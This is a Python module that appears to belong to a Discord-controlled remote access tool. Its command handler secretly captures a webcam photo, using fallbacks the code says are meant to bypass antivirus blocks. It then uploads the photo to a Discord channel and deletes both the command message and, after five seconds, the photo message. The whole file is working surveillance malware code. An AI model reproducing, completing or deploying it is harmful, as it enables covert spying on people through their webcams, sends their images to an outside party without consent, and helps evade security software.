import os
import discord
import datetime
import asyncio
from utils.capture_utils import capture_photo_fallback

PHOTO_PATH = os.path.join("data", "photo.jpg")

async def execute_photo_command(client, message, args, config=None):
    """
    Takes a photo using the webcam and sends it.
    Uses multi-tier fallbacks (DirectShow, MSMF, index scan) to bypass AV blocks.
    
    Usage: !photo or !webcam [-p]
    """
    time_str = datetime.datetime.now().strftime("%d-%m-%Y %H:%M:%S")

    success, res_path_or_err, method = await asyncio.to_thread(capture_photo_fallback, PHOTO_PATH)

    if success:
        caption = f"📷 Webcam Photo taken at {time_str} ({method})"
        photo_message = await message.channel.send(caption, file=discord.File(res_path_or_err))
        try:
            await message.delete()
        except Exception:
            pass
        print(f"[photo_command_LOG] - Photo taken at {time_str} via {method}.")

        if "-p" in args or "--persistent" in args:
            print("Persistent photo requested")
        else:
            await asyncio.sleep(5)
            try:
                await photo_message.delete()
            except Exception:
                pass
            print("Photo message deleted")
    else:
        await message.channel.send(f"⚠️ Photo Failed: {res_path_or_err}")
        try:
            await message.delete()
        except Exception:
            pass
